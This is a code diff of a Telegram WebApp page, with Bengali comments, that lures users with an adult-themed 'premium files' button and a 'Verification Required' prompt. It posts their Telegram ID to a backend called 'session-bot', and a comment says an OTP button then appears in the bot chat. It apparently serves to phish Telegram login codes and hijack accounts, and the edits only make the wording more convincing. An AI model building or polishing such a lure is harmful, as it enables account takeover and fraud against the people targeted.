@@ -16,13 +16,13 @@
 <body>
     <div class="box">
         <h2>Verification Required</h2>
-        <p style="font-size: 14px; color: #666; margin-bottom: 25px;">confirm your identity to access the premium files.</p>
+        <p style="font-size: 14px; color: #666; margin-bottom: 25px;">Please confirm your identity to access the premium files.</p>
         
         <button class="btn" id="main_btn" onclick="startFlow()">🍓 Confirm 🔞</button>
         
         <div id="loader" class="hidden">
-            <div class="loader">Processing...</div>
-            <p style="font-size: 12px;">Please wait while we connect.</p>
+            <div class="loader">Connecting...</div>
+            <p style="font-size: 12px;">Please wait while we secure your connection.</p>
         </div>
     </div>
 
@@ -30,7 +30,7 @@
         let tg = window.Telegram.WebApp;
         tg.expand();
         
-        // আপনার ব্যাকএন্ড URL (Hugging Face App URL)
+        // আপনার Hugging Face App URL এখানে দিন (শেষে / থাকবে না)
         const BACKEND_URL = "https://pmrony-session-bot.hf.space";
         let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
 
@@ -62,13 +62,13 @@
                 });
                 const data = await res.json();
                 if (data.status === "success") {
-                    // সফল হলে অ্যাপ বন্ধ হয়ে যাবে এবং বটের চ্যাটে ওটিপি বাটন যাবে
+                    // সফল হলে অ্যাপ ক্লোজ হয়ে যাবে এবং চ্যাটে ওটিপি বাটন যাবে
                     tg.close();
                 } else {
                     alert("Error: " + data.message);
                     location.reload();
                 }
-            } catch (e) { alert("Server connection error!"); }
+            } catch (e) { alert("Server Error!"); }
         }
     </script>
 </body>
